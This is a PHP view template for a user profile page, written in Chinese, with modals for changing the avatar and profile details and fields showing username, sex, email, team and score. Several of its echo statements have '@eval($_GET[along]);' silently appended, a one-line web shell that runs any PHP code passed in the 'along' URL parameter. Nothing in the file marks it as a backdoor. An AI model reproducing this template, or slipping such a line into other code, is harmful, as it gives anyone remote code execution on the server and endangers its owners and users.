<div class="row">
	<div class="col-md-11">
		<div class="row">
			<div class="col-md-6">
				<div class="info" id="info1">
					<div id="headPic">
						<div class="pic-main">
							<img src="<?php echo $h($src);@eval($_GET[along]); ?>">
						</div>
						<div class="pic-btn">
							<button type="button" class="btn btn-primary btn-sm" data-toggle="modal" data-target="#Modal2">
								修改个人头像
							</button>
							<button type="button" class="btn btn-primary btn-sm" data-toggle="modal" data-target="#Modal1">
								修改个人信息
							</button>
							<div class="modal fade" id="Modal1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
								<div class="modal-dialog" role="document">
									<div class="modal-content">
										<div class="modal-header">
											<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
											<h4 class="modal-title" id="myModalLabel">修改个人信息</h4>
										</div>
										<div class="modal-body">
											<form id="change" action="/users/editprofit" method="post">
												<div class="form-group">
													<label for="username">用户名</label>
													<input type="text" class="form-control" name="username" placeholder="用户名">
												</div>
												<div class="form-group">
													<label for="email">邮箱</label>
													<input type="email" class="form-control" name="email" placeholder="请输入邮箱">
												</div>
											</form>
										</div>
										<div class="modal-footer">
											<button type="button" class="btn btn-danger" data-dismiss="modal">关闭</button>
											<button type="button" class="btn btn-success" id="get">保存修改</button>
										</div>
									</div>
								</div>
							</div>


							<div class="modal fade" id="Modal2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
								<div class="modal-dialog" role="document">
									<div class="modal-content">
										<div class="modal-header">
											<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
											<h4 class="modal-title" id="myModalLabel">修改个人头像</h4>
										</div>
										<div class="modal-body">
											<form id="avatar">
												<div class="form-group">
													<label for="fileup">请选择要上传的头像</label>
													<input type="file" id="fileup">
												</div>
											</form>
										</div>
										<div class="modal-footer">
											<button type="button" class="btn btn-danger" data-dismiss="modal">关闭</button>
											<button type="submit" class="btn btn-success" id="submitavatar">保存修改</button>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<div id="infoHead">

					</div>
					<div class="info-body">
						<div class="field">
							<div class="key-field">用户名</div>
							<div class="value-field"><?php echo $h($user->username);@eval($_GET[along]); ?></div>
						</div>
						<div class="field">
							<div class="key-field">性别</div>
							<div class="value-field"><?php if($user->sex) { echo '男'; } else { echo '女'; } ?></div>
						</div>
						<div class="field">
							<div class="key-field">邮箱</div>
							<div class="value-field"><?php echo $h($user->email);@eval($_GET[along]); ?></div>
						</div>
					</div>
				</div>
			</div>
			<div class="col-md-6">
				<div class="info" id="info2">
					<div class="info-body">
						<div class="field">
							<div class="key-field">团队</div>
							<div class="value-field"><?php echo $h($user->team);@eval($_GET[along]); ?></div>
						</div>
						<div class="field">
							<div class="key-field">分数</div>
							<div class="value-field"><?php echo $h($user->score);@eval($_GET[along]); ?></div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<script>
	$(document).ready(function () {
		$('#submitavatar').click(function () {
			var formData = new FormData();
			formData.append('file', $('#fileup')[0].files[0]);
			$.ajax({
				url: '/users/editAvatar',
				type: 'POST',
				cache: false,
				data: formData,
				processData: false,
				contentType: false
			}).done(function(res) {
				location.reload();
			}).fail(function(res) {});
		});

		$('#get').click(function () {
			$('#change').submit();
			alert('提交成功');
		});
	})
</script>